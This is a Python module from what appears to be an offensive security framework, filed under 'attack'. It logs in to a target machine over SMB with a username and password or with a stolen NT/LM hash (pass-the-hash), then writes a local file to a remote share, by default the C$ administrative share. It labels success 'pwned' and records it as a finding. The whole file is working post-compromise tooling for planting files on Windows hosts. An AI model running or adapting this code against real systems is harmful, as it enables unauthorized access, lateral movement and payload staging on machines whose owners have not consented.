
# scripts/smb/attack/put.py
"""Upload a local file to a remote SMB share."""
import os
from pathlib import Path
from core.output import console, print_result
from core import session_db
from scripts.base import BaseScript

try:
    from impacket.smbconnection import SMBConnection
    _OK = True
except ImportError:
    _OK = False


class Script(BaseScript):
    name        = "put"
    protocol    = "smb"
    category    = "attack"
    description = "Upload a local file to a remote SMB share path."

    def run(self, **kwargs):
        if not _OK:
            console.print("[red]impacket not installed.[/red]"); return None

        ip         = self.target.ip
        domain     = self.creds.domain   or ""
        user       = self.creds.user     or ""
        passwd     = self.creds.password or ""
        nt_hash    = self.creds.hash     or ""
        timeout    = self.target.timeout or 5
        local_file = str(kwargs.get("local_file", ""))
        share      = str(kwargs.get("share", "C$"))
        remote_path= str(kwargs.get("remote_path", ""))

        if not local_file:
            console.print("[red]--local-file required.[/red]"); return None

        local_path = Path(local_file)
        if not local_path.exists():
            console.print(f"[red]File not found: {local_file}[/red]"); return None

        if not remote_path:
            remote_path = local_path.name

        lm_hash = ""
        if nt_hash and ":" in nt_hash:
            lm_hash, nt_hash = nt_hash.split(":", 1)

        try:
            conn = SMBConnection(ip, ip, timeout=timeout)
            conn.login(user, passwd, domain, lm_hash, nt_hash)
            with open(local_path, "rb") as fh:
                conn.putFile(share, remote_path, fh.read)
            conn.logoff()
        except Exception as e:
            print_result("SMB", ip, "fail", f"put failed: {e}"); return None

        print_result("SMB", ip, "pwned",
                     f"uploaded {local_path.name} -> \\\\{ip}\\{share}\\{remote_path}")
        session_db.DB.SaveFinding(ip, "SMB", "file_uploaded",
                                   f"{local_file} -> {share}/{remote_path}")
        return True
